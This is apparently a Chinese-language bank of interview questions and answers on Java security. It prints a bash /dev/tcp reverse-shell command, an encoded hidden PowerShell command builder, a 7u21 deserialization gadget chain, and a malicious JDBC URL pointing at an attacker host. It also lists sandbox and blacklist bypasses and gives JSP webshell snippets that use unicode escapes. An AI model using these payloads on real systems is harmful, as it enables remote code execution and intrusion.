## JDK

### Java反射做了什么事情（★）[+]

反射是根据字节码获得类信息或调用方法。从开发者角度来讲，反射最大的意义是提高程序的灵活性。Java本身是静态语言，但反射特性允许运行时动态修改类定义和属性等，达到了动态的效果



### Java反射可以修改Final字段嘛（★★）[+]

可以做到，参考以下代码

```java
field.setAccessible(true);
Field modifiersField = Field.class.getDeclaredField("modifiers");
modifiersField.setAccessible(true);
modifiersField.setInt(field, field.getModifiers() & ~Modifier.FINAL);
field.set(null, newValue);
```



### 传统的反射方法加入黑名单怎么绕（★★★）[+]

可以使用的类和方法如下（参考三梦师傅）

```java
ClassLoader.loadClass
ReflectUtil.forName
BytecodeDescriptor
sun.reflect.misc.MethodUtil
sun.reflect.misc.FieldUtil
sun.reflect.misc.ConstructorUtil
MethodAccessor.invoke
JSClassLoader.invoke
JSClassLoader.newInstance
```



### Java中可以执行反弹shell的命令吗（★★）[+]

可以执行，但需要对命令进行特殊处理。例如直接执行这样的命令：`bash -i >& /dev/tcp/ip/port 0>&1`会失败，简单来说因为`>`符号是重定向，如果命令中包含输入输出重定向和管道符，只有在`bash`下才可以，使用Java执行这样的命令会失败，所以需要加入`Base64`

```shell
bash -c {echo,base64的payload}|{base64,-d}|{bash,-i}
```

针对`Powershell`应该使用以下的命令

```shell
powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc 特殊的Base64
```

这个特殊的Base64和普通Base64不同，需要填充0，算法如下

```java
public static String getPowershellCommand(String cmd) {
    char[] chars = cmd.toCharArray();
    List<Byte> temp = new ArrayList<>();
    for (char c : chars) {
        byte[] code = String.valueOf(c).getBytes(StandardCharsets.UTF_8);
        for (byte b : code) {
            temp.add(b);
        }
        temp.add((byte) 0);
    }
    byte[] result = new byte[temp.size()];
    for (int i = 0; i < temp.size(); i++) {
        result[i] = temp.get(i);
    }
    String data = Base64.getEncoder().encodeToString(result);
    String prefix = "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc ";
    return prefix + data;
}
```



### 假设`Runtime.exec`加入黑名单还有什么方式执行命令（★★）[+]

其实这个问题有点类似`JSP Webshell`免杀

大致方法有这些：使用基本的反射，ProcessImpl和ProcessBuilde，JDNI和LDAP注入，TemplatesImpl，BCEL，BeansExpression，自定义ClassLoader，动态编译加载，ScriptEngine，反射调用一些native方法，各种EL（SPEL和Tomcat EL等）



### RMI和LDAP类型的JNDI注入分别在哪个版本限制（★）[+]

RMI的JNDI注入在8u121后限制，需要手动开启`com.sun.jndi.rmi.object.trustURLCodebase`属性

LDAP的JNDI注入在8u191后限制，需要开启`com.sun.jndi.ldap.object.trustURLCodebase`属性



### RMI和LDAP的限制版本分别可以怎样绕过（★★）[+]

RMI的限制是限制了远程的工厂类而不限制本地，所以用本地工厂类触发

通过`org.apache.naming.factory.BeanFactory`结合`ELProcessor`绕过

LDAP的限制中不对`javaSerializedData`验证，所以可以打本地`gadget`



### 谈谈TemplatesImpl这个类（★★）[+]

这个类本身是JDK中XML相关的类，但被很多`Gadget`拿来用

一般情况下加载字节码都需要使用到ClassLoader来做，其中最核心的`defineClass`方法只能通过反射来调用，所以实战可能比较局限。但JDK中有一个`TemplatesImpl`类，其中包含`TransletClassLoader`子类重写了`defineClass`所以允许`TemplatesImpl`类本身调用。`TemplatesImpl`其中有一个特殊字段`_bytecodes`是一个二维字节数组，是被加载的字节码

通过`newTransformer`可以达到`defineClass`方法加载字节码。而`getOutputProperties`方法（getter）中调用了`newTransformer`方法，也是一个利用链

```text
TemplatesImpl.getOutputProperties()
	TemplatesImpl.newTransformer()
	TemplatesImpl.getTransletInstance()
	TemplatesImpl.defineTransletClasses()
	ClassLoader.defineClass()
	Class.newInstance()
```



### 了解BCEL ClassLoader吗（★）[+]

（镜像问题：

**bcel利用条件**

）

BCEL用于操作字节码.

BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目

该类常常用于各种漏洞利用POC的构造，可以加载特殊的字符串所表示的字节码

但是在Java 8u251之后该类从JDK中移除（即对Java版本有限制）



### 谈谈7U21反序列化（★★★★★）[+]

从`LinkedHashSet.readObject`开始，找到父类`HashSet.readObject`方法，其中包含`HashMap`的类型转换以及`HashMap.put`方法，跟入`HashMap.put`其中对`key`与已有`key`进行`equals`判断，这个`equals`方法是触发后续利用链的关键。但`equals`方法的前置条件必须满足

```java
if (e.hash == hash && ((k = e.key) == key || key.equals(k)))
```

所以这里需要用哈希碰撞，让下一个`key`的哈希值和前一个相等，才可进入第二个条件。而第二个条件中必须让前一个条件失败才可以进去`equals`方法，两个`key`对象不相同是显而易见的

接下来的任务是找到一处能触发`equals`方法的地方

反射创建`AnnotationInvocationHandler`对象，传入`Templates`类型和`HashMap`参数。再反射创建被该对象代理的新对象，根据动态代理技术，代理对象方法调用需要经过`InvocationHandler.invoke`方法，在`AnnotationInvocationHandler`这个`InvocationHandler`的`invoke`方法实现中如果遇到`equals`方法，会进入`equalsImpl`方法，其中遍历了`equals`方法传入的参数`TemplatesImpl`的所有方法并反射调用，通过`getOutputProperties`方法最终加载字节码导致RCE

关于7U21的伪代码如下

```java
Object templates = Gadgets.createTemplatesImpl();
String zeroHashCodeStr = "f5a5a608";
HashMap map = new HashMap();
Constructor<?> ctor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
ctor.setAccessible(true);
InvocationHandler tempHandler = (InvocationHandler) ctor.newInstance(Templates.class, map);
Templates proxy = (Templates) Proxy.newProxyInstance(exp.class.getClassLoader(), templates.getClass().getInterfaces(), tempHandler);
LinkedHashSet set = new LinkedHashSet();
set.add(templates);
set.add(proxy);
map.put(zeroHashCodeStr, templates);
return set;
```

结合调用链

```text
LinkedHashSet.readObject()
  LinkedHashSet.add()/HashMap.put()
      Proxy(Templates).equals()
        AnnotationInvocationHandler.invoke()
          AnnotationInvocationHandler.equalsImpl()
            Method.invoke()
              ...
                TemplatesImpl.getOutputProperties()
```

可以看到伪代码最后在`map`中`put`了某个元素，这是为了处理哈希碰撞的问题。`TemplatesImpl`没有重写`hashcode`直接调用`Object`的方法。而代理对象的`hashcode`方法也是会先进入`invoke`方法的，跟入`hashCodeImpl`方法看到是根据传入参数`HashMap`来做的，累加每一个`Entry`的`key`和`value`计算得出的`hashcode`。通过一些运算，可以找到符合条件的碰撞值



### 谈谈8U20反序列化（★★★★★）

这是7U21修复的绕过

在`AnnotationInvocationHandler`反序列化调用`readObject`方法中，对当前`type`进行了判断。之前POC中的`Templates`类型会导致抛出异常无法继续。使用`BeanContextSupport`绕过，在它的`readObject`方法中调用`readChildren`方法，其中有`try-catch`但没有抛出异常而是`continue`继续

所以这种情况下，就算之前的反序列化过程中出错，也会继续进行下去。但想要控制这种情况，不可以用正常序列化数据，需要自行构造畸形的序列化数据



### 了解缩小反序列化Payload的手段吗（★★★）[+]

首先最容易的方案是使用Javassist生成字节码，这种情况下生成的字节码较小。进一步可以用ASM删除所有的LineNumber指令，可以更小一步。最终手段可以分块发送多个Payload最后合并再用URLClassLoader加载



### 谈谈实战中命令执行有哪些回显的办法（★★★★）[+]

首先想到的办法是`dnslog`等技术进行外带，但必须出网，有限制

然后类似内存马的思路，针对指定中间件找`response`对象写入执行结果

尝试写文件，往`web`目录下写，例如`xx.html`可以访问到即可

将命令执行结果抛出异常，然后用`URLClassLoader`加载，达到报错回显

Y4er师傅提到的自定义类加载器配合RMI的一种方式



### 有没有了解过针对`linux`的通杀的回显方式（★★★★）

获取本次`http`请求用到`socket`的文件描述符，然后往文件描述符里写命令执行的结果

但鸡肋的地方在于需要确定源端口，才可以使用命令查到对应的文件描述符，存在反代可能有问题



### 是否存在针对`windows`的通杀的回显方式（★★★★）

原理类似`linux`的通杀回显，在`windows`中`nio/bio`中有类似于`linux`文件描述符这样的句柄文件

遍历`fd`反射创建对应的文件描述符，利用`sun.nio.ch.Net#remoteAddress`确认文件描述符有效性，然后往里面写数据实现回显



### 是否了解JDBC Connection URL攻击（★★★）

如果我们可以控制`JDBC URI`就可将`JDBC`连接地址指向攻击者事先准备好的恶意服务器，这个服务器可以返回恶意的序列化数据

指定`autoDeserialize`参数为`true`后`MySQL`客户端就可以自动反序列化恶意Payload

使用`ServerStatusDiffInterceptor`触发客户端和服务端的交互和反序列化

```text
jdbc:mysql://attacker/db?queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true
```

以上是基本攻击手段，还有一些进阶的内容，例如`allowUrlInLocalInfile`和`detectCustomCollations`参数



### 你知道JDK针对反序列化漏洞做了什么修复嘛（★★★）

在`JEP 290`中提供一个限制反序列化的类的机制，黑白名单方式，同时限制反序列化深度和复杂度，为 RMI 导出的对象设置了验证机制。具体实现是提供一个全局过滤器，可以从属性或者配置文件中配置。在`ObjectInputStream`类中增加了一个`serialFilter`属性和一个`filterChcek`函数，其中`serialFilter`就可以理解为过滤器



### JEP 290有没有绕过的办法（★★★★★）

根据`JEP 290`限制的原理，白名单对象包括了：String,Remote,Proxy,UnicaseRef,RMIClientSocketFactory等

如果目标的`RMI`服务暴漏了`Object`参数类型的方法，且该类在白名单中，我们就可以注入Payload进去以绕过检测

另外还一些骚思路，比如想办法改源码，或用`Java Agent`对某些方法`Hook`并更改等



### 谈谈`Security Manager`的绕过（★★★★）

通过设置参数`java.security.policy`指定`policy`以提权；反射调用`setSecurityManager`修改`Security Manager`以绕过；自定义`ClassLoader`并设置`ProtectionDomain`里面的权限初始化为所有权限以绕过；由于`native`方法不受`Java Security Manager`管控，所以可以调用这些方法绕过



### 简单谈谈类加载的过程（★★）[+]

首先是由`C/C++`编写的`Bootstrap ClassLoader`用于加载`rt.jar`等核心包

然后是`Extension ClassLoader`加载`JDK`中`Ext`目录的包，可以加入自定义的包

接着是`Application Classloader`加载`CLASSPATH`中的类，项目中的类都是由该类加载器加载完成的

最后是自定义类加载器，继承`ClassLoader`类重写`findClass`方法，在`Webshell`中有应用



### 简单谈谈双亲委派（★）[+]

当某个类加载器需要加载某个`class`文件时，首先把这个任务委托给他的上级类加载器，递归这个操作，如果上级的类加载器没有加载，自己才会去加载这个类

父类加载器一层一层往下分配任务，如果子类加载器能加载，则加载此类，如果将加载任务分配至系统类加载器也无法加载此类，则抛出异常



### 双亲委派主要作用是什么（★★）[+]

最主要的作用是保证系统类的安全，基础类不会被自定义类加载器破坏和篡改，其次防止重复加载可以提高效率



### RASP如何绕过（★★）

使用`JNI`是比较通用的办法，具体到每一种漏洞类型，也会有其他的绕过方式（参数污染，特殊字符等等）



### 简单谈一谈SecurityManager是干什么的（★★★）

`Java Security Manager`的一个典型应用场景是`JVM`需要加载运行一段代码，但是这段代码是不可信的

例如来自用户的输入上传和反序列化指定的`bytecode`或者使用`URLClassLoader`在网络中远程加载等

这些情况下，需要防止不可信来源的恶意代码对系统造成破坏。其实这就是沙箱的应用场景



### 谈一谈SecurityManager的绕过姿势（★★★★）

（1）单等号`+home`目录可写导致`Java Security Manager`绕过

例如这样指定`policy`文件：`-Djava.security.policy=java.policy`

（2）通过`setSecurityManager`绕过`Java Security Manager`

恶意代码可以在运行时调用`setSecurityManager`方法将`SecurityManager`置为`null`以绕过

（3）通过反射绕过`Java Security Manager`

反射调用`getProtectionDomain0`方法将所有`hasAllPerm`属性设置为`true`

（4）自定义类加载器绕过

（5）通过`JNI`调用`native`方法绕过



### 是否了解利用unicode特性的JSP Webshell绕过（★★★）[+]

编译`JSP`时其中的`unicode`会进行解码，其中`\u000a`变成换行，导致后面的`exec`可以执行

```java
<%
  Runtime.getRuntime().
  //\u000aexec
  (request.getParameter("cmd"));
%>
```

加入转义符将会变成简单的注释，这将变成普通的`webshell`

```java
<%
  Runtime.getRuntime().
  //\\u000axxxxxx
  exec(request.getParameter("cmd"));
%>
```

一种特殊的方式（原理较复杂暂不分析）

```java
<%
  Runtime.getRuntime().
  //\u000d\uabcdexec(request.getParameter("cmd"));
%>
```